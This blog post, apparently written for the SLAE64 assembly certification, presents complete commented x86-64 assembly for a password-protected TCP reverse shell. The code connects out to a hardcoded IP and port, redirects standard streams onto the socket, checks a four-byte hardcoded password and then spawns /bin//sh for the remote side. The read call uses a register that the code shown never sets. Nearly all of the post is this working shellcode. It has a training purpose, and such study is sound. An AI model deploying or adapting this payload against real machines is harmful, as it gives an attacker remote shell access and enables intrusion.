---
layout: post
title: SLAE64 Assignment 2 - password protected tcp revshell
excerpt: asm code and comments for my pass protected tcp reverse shell
---

    ; author     : Sandro "guly" Zaccarini SLAE64-1497
    ; purpose    : this program will open a connection to given IP:Port and spawns a shell
    ;              shell if the first 4chars from  match an hardcoded password
    ;              this code has been written for SLAE64 assignment 2
    ; references : https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ ,
    ;              /usr/include/linux/net.h
    ; license    : CC-BY-NC-SA
    ;
    ; high level flow:
    ; socket -> connect -> read pass -> dup fd -> spawn /bin//sh
    
      global _start
    
    ; define
    PASSWORD equ 'guly'     ; 0x796c7567
    PORT     equ 0x5c11     ; 4444
    IP       equ 0x0101017f ; 127.1.1.1 as starter
    
      _start:
    ; create a TCP socket
    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; rdi => AF_INET = 2
    ; rsi => SOCK_STREAM = 1
    ; rax => syscall number 0x29
    xor rax,rax
    push rax
    pop rsi
    push rsi
    pop rdx
    add ax,0x29
    mov dil, 0x2
    inc rsi
    syscall
    
    ; syscall rets socketfd to rax. copy it to edi, we need it for the whole process
    ; again, working with 32bit to save some bytes
    mov edi,eax
    
    ; connect(sock, (struct sockaddr *)&server, sockaddr_len)
    ; struct:
    ; server.sin_family = AF_INET => 0x2
    ; server.sin_port = htons(PORT) => from PORT
    ; server.sin_addr.s_addr = inet_addr("127.0.0.1") => from IP
    ; bzero(&server.sin_zero, 8)
    ;
    ; rdi => 
    ; rsi => 
    ; rax => syscall id 0x2a
    ;
    ; use rax to make room for the struct
    xor rax,rax
    push rax
    mov dword [rsp + 0x4], IP
    mov word [rsp + 0x2], PORT
    mov byte [rsp], 0x2
    
    ; push the struct
    ; smaller than mov
    push rsp
    pop rsi
    push 0x10
    pop rdx
    mov al, 0x2a
    ; and do the call
    syscall
    
    ; duplicate sockets
    ; dup2 (new, old)
    xor eax,eax
    xor rsi,rsi
    mov al, 0x21
    syscall
    
    mov al, 0x21
    inc esi
    syscall
    
    mov al, 0x21
    inc esi
    syscall
    
    ; check for the password
    readpass:
    ; syscall is 0x0, so a xor will be perfect
    ; i also need to move a small value to rdx, i zero it too
    xor rdx, rdx
    mov rax,rdx
    
    ; to have some room for the read, i'm pushing a full null here
    push rdx
    
    ; because i known my pass is just 0x4 chars, i force it here.
    ; see description for possible issue
    mov dl, 0x4
    
    ; and put the pointer to the stack to rsi
    mov rsi, rsp
    mov rdi,r9
    
    ; do the read
    syscall
    
    ; to change something from bindshell, do it with cmp and a straight check
    cmp dword [rsp], PASSWORD
    ; if doesn't match, back to readpass. using this "loop" i can fail password and have
    ; the shell listening again.
    ; as i said in the description, i don't care about bruteforce and that's why no counter
    jne readpass
    
    
    
    
    ; and finally, execve
    ;
    ; rdi => pointer to filename, /bin//sh null terminated
    ; rsi => pointer to argv
    ; rdx => pointer to envp, null
    ; rax => syscall id 0x3b
    
    ; push a null terminator
    xor rax, rax
    push rax
    ; pointer to 0x0 for envp
    mov rdx,rsp
    
    ; and push /bin//sh in reverse
    mov rbx, 0x68732f2f6e69622f
    push rbx
    
    ; finally store pointer to rdi and rsi
    mov rdi, rsp
    push rax
    push rdi
    mov rsi, rsp
    
    ; do the call
    add rax, 0x3b
    syscall
    
*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/*
